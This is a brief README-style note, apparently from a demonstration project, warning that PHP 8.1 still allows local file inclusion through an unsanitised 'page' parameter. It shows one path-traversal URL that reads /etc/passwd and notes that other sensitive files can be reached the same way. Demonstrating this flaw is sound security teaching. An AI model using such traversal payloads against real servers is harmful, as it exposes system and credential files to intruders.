# php 8.1 still allows this to happen!

This is really bad practice!

```
http://localhost/path/to/file_includes_bad/index.php?page=../../../../../../../../../../../../../../../etc/passwd
```

will return a copy of /etc/passwd to the browser!

Which means that you can also access other sensitive files!